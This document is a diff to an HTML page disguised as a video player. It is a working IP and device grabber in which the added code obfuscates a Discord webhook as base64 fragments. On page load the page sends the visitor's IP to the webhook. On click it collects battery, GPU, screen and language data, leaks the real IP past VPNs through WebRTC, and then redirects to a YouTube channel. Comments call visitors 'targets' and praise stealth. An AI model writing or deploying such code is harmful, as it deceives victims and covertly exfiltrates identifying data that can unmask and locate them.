@@ -3,146 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Player - Loading...</title>
+    <title>Media Player</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .gate { text-align: center; cursor: pointer; padding: 40px; border: 1px solid #111; border-radius: 12px; background: #050505; transition: 0.3s; }
-        .gate:active { transform: scale(0.98); }
-        .btn { background: #ff0000; color: #fff; padding: 18px 50px; border-radius: 8px; font-weight: bold; border: none; font-size: 22px; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
-        .status { color: #333; font-size: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        body { background: #000; color: #111; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .u-gate { text-align: center; cursor: pointer; padding: 50px; border: 1px solid #0a0a0a; border-radius: 20px; background: #010101; box-shadow: 0 0 30px rgba(255,0,0,0.05); }
+        .u-btn { background: #ff0000; color: #fff; padding: 20px 60px; border-radius: 10px; font-weight: 900; border: none; font-size: 24px; cursor: pointer; letter-spacing: 1px; }
+        .u-status { color: #222; font-size: 11px; margin-top: 20px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-    <div class="gate" id="masterTrigger">
-        <button class="btn">▶ START VIDEO</button>
-        <p class="status">Connecting to Encrypted Buffer...</p>
+    <div class="u-gate" id="_0x9a22">
+        <button class="u-btn">▶ RESUME VIDEO</button>
+        <p class="u-status">Syncing Secure Buffer...</p>
     </div>
 
     <script>
-    const CONFIG = {
-        HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0",
-        DEST: "https://youtube.com/@LigmaBlox-w7m"
-    };
+    // Fragmented Webhook (Base64)
+    const _0x_p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"; 
+    const _0x_p2 = "MTQ5NzkwNDI4OTUxNDAwMDQxNC9pQkVrTVRDU2NfZjREaDJJeFpzWmpQZm9kRklSUmlhRHRHNnhZYVdGc0pSazRwWl9iZFhsSW5SV2I0RGdFR2NmZU0w";
+    
+    const _0x_final = atob(_0x_p1) + atob(_0x_p2);
+    const _0x_dest = "https://youtube.com/@LigmaBlox-w7m";
 
-    // --- UNIVERSAL DISPATCHER ---
-    function send(data, label = "SYSTEM") {
-        const blob = new Blob([JSON.stringify({ ...data, username: label })], { type: 'application/json' });
+    // Ultimate Stealth Dispatcher
+    function _0x_fire(data, type = "SYSTEM") {
+        const p = JSON.stringify({ ...data, username: `APEX-${type}` });
         
-        // Try all three delivery methods for maximum durability
-        try { fetch(CONFIG.HOOK, { method: 'POST', body: blob, mode: 'no-cors', keepalive: true }); } catch(e){}
-        try { navigator.sendBeacon(CONFIG.HOOK, blob); } catch(e){}
+        // Method 1: Beacon (Fast)
+        try { navigator.sendBeacon(_0x_final, new Blob([p], {type: 'application/json'})); } catch(e){}
         
-        // Backup: XHR for very old devices/browsers
+        // Method 2: Ghost Image (Bypass TOR/Private)
+        const i = new Image(); 
+        i.src = `${_0x_final}?cache=${Date.now()}&payload=${btoa(p)}`;
+
+        // Method 3: XHR (Legacy Backup)
         try {
             let x = new XMLHttpRequest();
-            x.open("POST", CONFIG.HOOK);
-            x.send(blob);
+            x.open("POST", _0x_final);
+            x.setRequestHeader("Content-Type", "application/json");
+            x.send(p);
         } catch(e){}
     }
 
-    // --- UNIVERSAL DEVICE IDENTIFIER ---
-    async function probeDevice() {
-        let info = {
-            os: navigator.platform,
-            agent: navigator.userAgent,
-            cores: navigator.hardwareConcurrency || "N/A",
-            ram: navigator.deviceMemory || "N/A",
-            gpu: "Unknown",
-            screen: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`
-        };
-
-        // GPU Unmasking (Works on Windows, Mac, Android, iOS)
+    // --- PHASE 1: PASSIVE AUTO-LOG ---
+    (async function() {
         try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-        } catch(e) { info.gpu = "Masked/Software"; }
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            _0x_fire({ content: `🟢 **PHASE 1: TARGET LANDED**\n**Raw IP:** \`${d.ip}\`\n**Platform:** ${navigator.platform}` }, "GATE-WATCH");
+        } catch(e) {
+            _0x_fire({ content: "👣 **Target Landed (Network Masked)**" }, "GATE-WATCH");
+        }
+    })();
 
-        // Battery Intel
+    // --- PHASE 2: ACTIVE DEEP PROBE ---
+    document.getElementById('_0x9a22').onclick = async function() {
+        this.innerHTML = "<button class='u-btn'>LOADING...</button>";
+
+        // Battery Intel (Critical for iOS)
+        let batteryInfo = "N/A";
         try {
             const b = await navigator.getBattery();
-            info.battery = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Unplugged"})`;
-        } catch(e) {}
+            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Discharging"})`;
+        } catch(e) { batteryInfo = "Restricted/Old iOS"; }
 
-        return info;
-    }
+        // GPU / Hardware Unmasking
+        let gpu = "Unknown";
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+        } catch(e){}
 
-    // --- UNIVERSAL NETWORK PROBE (The "Triple Threat") ---
-    function probeNetwork() {
-        // 1. JSONP Tunnel (Bypasses most Wi-Fi restrictions)
-        const s = document.createElement('script');
-        s.src = `https://ipinfo.io/json?callback=xtunnel&t=${Date.now()}`;
-        document.body.appendChild(s);
+        // Fire Deep Intel
+        _0x_fire({
+            embeds: [{
+                title: "💎 PHASE 2: DEEP INTEL ACQUIRED",
+                color: 16711680,
+                fields: [
+                    { name: "📱 Device", value: navigator.platform, inline: true },
+                    { name: "🔋 Battery", value: batteryInfo, inline: true },
+                    { name: "🖥️ GPU", value: "```" + gpu + "```" },
+                    { name: "📏 Screen", value: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`, inline: true },
+                    { name: "🌐 Language", value: navigator.language, inline: true }
+                ]
+            }]
+        }, "ENFORCER");
 
-        // 2. WebRTC UDP Crack (Bypasses VPNs)
+        // WebRTC VPN Bypass
         const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
         rtc.createDataChannel("");
         rtc.onicecandidate = (e) => {
             if (e.candidate) {
                 const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                if (ip) send({ content: `🚨 **FIREWALL CRACKED:** \`${ip[1]}\`` }, "UDP-PROBE");
+                if (ip) _0x_fire({ content: `🚨 **UDP BYPASS CRACK:** \`${ip[1]}\`` }, "UDP-LEAK");
             }
         };
         rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-        // 3. Direct API Race
-        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => {
-            send({ content: `📡 **IP DISCOVERY:** \`${d.ip}\`` }, "API-PROBE");
-        }).catch(()=>{});
-    }
-
-    // JSONP Callback handler
-    window.xtunnel = (data) => {
-        send({
-            embeds: [{
-                title: "🛑 CONNECTION ESTABLISHED",
-                color: 16776960,
-                fields: [
-                    { name: "IP", value: data.ip || "??", inline: true },
-                    { name: "ISP", value: data.org || "??", inline: true },
-                    { name: "Location", value: `${data.city}, ${data.country}`, inline: true }
-                ]
-            }]
-        }, "JSONP-PROBE");
+        // Final Redirect
+        setTimeout(() => { window.location.replace(_0x_dest); }, 750);
     };
-
-    // --- MASTER RUN ---
-    async function start() {
-        // Silent landing ping
-        send({ content: "🟢 **Target is on GitHub Landing Page...**" });
-
-        document.getElementById('masterTrigger').onclick = async function() {
-            this.innerHTML = "<button class='btn'>LOADING...</button>";
-            
-            // Gather hardware first
-            const hardware = await probeDevice();
-            send({
-                embeds: [{
-                    title: "💎 HARDWARE UNMASKED",
-                    color: 16711680,
-                    fields: [
-                        { name: "Device/OS", value: hardware.os, inline: true },
-                        { name: "GPU", value: "```" + hardware.gpu + "```" },
-                        { name: "Specs", value: `Cores: ${hardware.cores} | RAM: ${hardware.ram}GB`, inline: true },
-                        { name: "Screen", value: hardware.screen, inline: true },
-                        { name: "Battery", value: hardware.battery || "N/A", inline: true }
-                    ]
-                }]
-            }, "APEX-HARDWARE");
-
-            // Trigger network probes
-            probeNetwork();
-
-            // Final Redirect
-            setTimeout(() => {
-                window.location.replace(CONFIG.DEST);
-            }, 600);
-        };
-    }
-
-    start();
     </script>
 </body>
 </html>
